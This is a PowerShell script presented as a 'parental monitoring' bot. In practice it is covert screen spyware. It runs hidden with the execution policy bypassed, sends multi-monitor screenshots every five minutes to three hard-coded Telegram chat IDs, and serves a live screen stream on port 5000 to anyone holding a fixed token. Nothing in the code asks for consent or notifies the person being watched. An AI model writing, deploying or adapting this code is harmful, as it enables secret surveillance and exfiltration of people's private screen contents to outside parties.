<#
monitor_bot.ps1
Parental monitoring script in PowerShell

Run for debugging:
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\monitor_bot.ps1

Run silently (once stable):
    powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File .\monitor_bot.ps1
#>

# ----------------------------
# GLOBAL CONFIG
# ----------------------------
$ErrorActionPreference = "Stop"   # Fail fast on errors
$TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
$CHAT_IDS = @(7208529004, 1399455903, 901578154)
$STREAM_PORT = 5000
$STREAM_TOKEN = "ZGFza2pkaGFranNkaGthanNkaGtpb2xxa2pmZ2RuZGlmZ2p5OTI0MzU2NzkzNDU3OTM0a2JuamZramRoZmtqYmRramZoc2Y="
$FRAME_INTERVAL = 0.8
$JPEG_QUALITY = 50
$AUTO_INTERVAL = 300
$RESIZE_SCALE = 0.5
$LOG_FILE = "monitor_bot.log"
$global:tempJpg = [IO.Path]::Combine($env:TEMP, "monitor_bot_temp.jpg")

# ----------------------------
# LOGGING
# ----------------------------
function Log {
    param([string]$msg, [string]$level = "INFO")
    $entry = "{0} - {1} - {2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $level, $msg
    $entry | Out-File -FilePath $LOG_FILE -Append -Encoding utf8
    Write-Output $entry   # will show if console is visible
}

# Log all unhandled errors automatically
Register-EngineEvent PowerShell.OnError -Action {
    $err = $EventArgs.Exception
    Add-Content -Path $LOG_FILE -Value "$(Get-Date) - UNHANDLED ERROR: $err"
}

# ----------------------------
# CAPTURE FUNCTIONS
# ----------------------------
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
} catch {
    Log "Failed to load drawing assemblies: $_" "ERROR"
    exit 1
}

function Capture-MonitorBitmap {
    param([int]$monitorIndex = 1)
    try {
        $screens = [System.Windows.Forms.Screen]::AllScreens
        if ($monitorIndex -lt 1 -or $monitorIndex -gt $screens.Length) {
            Log "Invalid monitor index $monitorIndex; using 1" "WARN"
            $monitorIndex = 1
        }
        $screen = $screens[$monitorIndex - 1]
        $rect = $screen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $rect.Width, $rect.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($rect.X, $rect.Y, 0, 0, $rect.Size)
        $g.Dispose()
        return $bmp
    } catch {
        Log "Capture-MonitorBitmap error: $_" "ERROR"
        return $null
    }
}

function Capture-CombinedImageBytes {
    try {
        $bmp1 = Capture-MonitorBitmap -monitorIndex 1
        if (-not $bmp1) { throw "Monitor 1 capture failed" }

        $bmp2 = $null
        if ([System.Windows.Forms.Screen]::AllScreens.Count -ge 2) {
            try { $bmp2 = Capture-MonitorBitmap -monitorIndex 2 } catch { }
        }

        # Scale down if needed
        function Scale-Image($bmp) {
            $newW = [int]($bmp.Width * $RESIZE_SCALE)
            $newH = [int]($bmp.Height * $RESIZE_SCALE)
            $scaled = New-Object System.Drawing.Bitmap $newW, $newH
            $g = [System.Drawing.Graphics]::FromImage($scaled)
            $g.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
            $g.DrawImage($bmp, 0, 0, $newW, $newH)
            $g.Dispose()
            $bmp.Dispose()
            return $scaled
        }

        if ($RESIZE_SCALE -lt 1) {
            $bmp1 = Scale-Image $bmp1
            if ($bmp2) { $bmp2 = Scale-Image $bmp2 }
        }

        if ($bmp2) {
            $width = $bmp1.Width + $bmp2.Width
            $height = [Math]::Max($bmp1.Height, $bmp2.Height)
            $combined = New-Object System.Drawing.Bitmap $width, $height
            $g = [System.Drawing.Graphics]::FromImage($combined)
            $g.Clear([System.Drawing.Color]::Black)
            $g.DrawImage($bmp1, 0, 0)
            $g.DrawImage($bmp2, $bmp1.Width, 0)
            $g.Dispose()
            $bmp1.Dispose(); $bmp2.Dispose()
        } else {
            # Duplicate monitor1 if single-monitor
            $width = $bmp1.Width * 2
            $height = $bmp1.Height
            $combined = New-Object System.Drawing.Bitmap $width, $height
            $g = [System.Drawing.Graphics]::FromImage($combined)
            $g.Clear([System.Drawing.Color]::Black)
            $g.DrawImage($bmp1, 0, 0)
            $g.DrawImage($bmp1, $bmp1.Width, 0)
            $g.Dispose()
            $bmp1.Dispose()
        }

        # Encode to JPEG
        $ms = New-Object System.IO.MemoryStream
        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
        $params = New-Object System.Drawing.Imaging.EncoderParameters 1
        $params.Param[0] = (New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [int]$JPEG_QUALITY))
        $combined.Save($ms, $jpegCodec, $params)
        $combined.Dispose()
        $bytes = $ms.ToArray()
        $ms.Dispose()
        return $bytes
    } catch {
        Log "Capture-CombinedImageBytes error: $_" "ERROR"
        return $null
    }
}

# ----------------------------
# TELEGRAM
# ----------------------------
function Send-Message($text) {
    foreach ($id in $CHAT_IDS) {
        try {
            $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
            Invoke-RestMethod -Uri $url -Method Post -Body @{ chat_id = $id; text = $text }
        } catch { Log "Telegram sendMessage failed: $_" "ERROR" }
    }
}

function Send-CombinedScreenshot {
    $bytes = Capture-CombinedImageBytes
    if (-not $bytes) { return }
    try {
        [System.IO.File]::WriteAllBytes($global:tempJpg, $bytes)
        foreach ($id in $CHAT_IDS) {
            $url = "https://api.telegram.org/bot$TOKEN/sendPhoto"
            $form = @{ chat_id = $id; caption = "Screen 1`n`nScreen 2"; photo = Get-Item $global:tempJpg }
            Invoke-RestMethod -Uri $url -Method Post -Form $form
        }
    } catch { Log "Telegram sendPhoto failed: $_" "ERROR" }
    finally { if (Test-Path $global:tempJpg) { Remove-Item $global:tempJpg -ErrorAction SilentlyContinue } }
}

# ----------------------------
# AUTO SCREENSHOT LOOP
# ----------------------------
function Start-AutoScreenshotLoop {
    Start-Job -Name "AutoScreenshot" -ScriptBlock {
        while ($true) {
            try { Send-CombinedScreenshot } catch {}
            Start-Sleep -Seconds $using:AUTO_INTERVAL
        }
    } | Out-Null
    Log "AutoScreenshot loop started"
}

# ----------------------------
# HTTP STREAM
# ----------------------------
function Start-HttpServer {
    try {
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add("http://+:$STREAM_PORT/")
        $listener.Start()
        Log "HTTP server started on port $STREAM_PORT"
    } catch {
        Log "HttpListener start failed: $_" "ERROR"
        exit 1
    }

    while ($listener.IsListening) {
        try {
            $ctx = $listener.GetContext()
            Start-Job -ScriptBlock {
                param($ctx, $STREAM_TOKEN, $FRAME_INTERVAL)
                $path = $ctx.Request.Url.AbsolutePath
                $resp = $ctx.Response
                if ($path -eq "/s") {
                    $html = "<html><body><img src='/stream?token=$STREAM_TOKEN' style='width:100%'></body></html>"
                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
                    $resp.ContentType = "text/html"
                    $resp.OutputStream.Write($bytes,0,$bytes.Length)
                    $resp.Close()
                } elseif ($path -eq "/stream") {
                    $q = [System.Web.HttpUtility]::ParseQueryString($ctx.Request.Url.Query)
                    if ($q.Get("token") -ne $STREAM_TOKEN) {
                        $resp.StatusCode = 401; $resp.Close(); return
                    }
                    $boundary = "--frame"
                    $resp.ContentType = "multipart/x-mixed-replace; boundary=$boundary"
                    $resp.SendChunked = $true
                    $out = $resp.OutputStream
                    try {
                        while ($true) {
                            $bytes = Capture-CombinedImageBytes
                            if ($bytes) {
                                $hdr = "`r`n$boundary`r`nContent-Type: image/jpeg`r`nContent-Length: $($bytes.Length)`r`n`r`n"
                                $hdrBytes = [System.Text.Encoding]::ASCII.GetBytes($hdr)
                                $out.Write($hdrBytes,0,$hdrBytes.Length)
                                $out.Write($bytes,0,$bytes.Length)
                                $out.Flush()
                            }
                            Start-Sleep -Seconds $FRAME_INTERVAL
                        }
                    } catch {} finally { $out.Close(); $resp.Close() }
                } else {
                    $resp.StatusCode = 404; $resp.Close()
                }
            } -ArgumentList $ctx, $STREAM_TOKEN, $FRAME_INTERVAL | Out-Null
        } catch { Log "HttpListener loop error: $_" "ERROR" }
    }
}

# ----------------------------
# MAIN
# ----------------------------
try {
    Log "Script starting"
    Send-Message "Script Started ✅"
    Send-CombinedScreenshot
    Start-AutoScreenshotLoop
    Start-HttpServer
} catch {
    Log "Fatal script error: $_" "ERROR"
    Send-Message "Script Closed ❌"
} finally {
    Log "Script terminating"
}
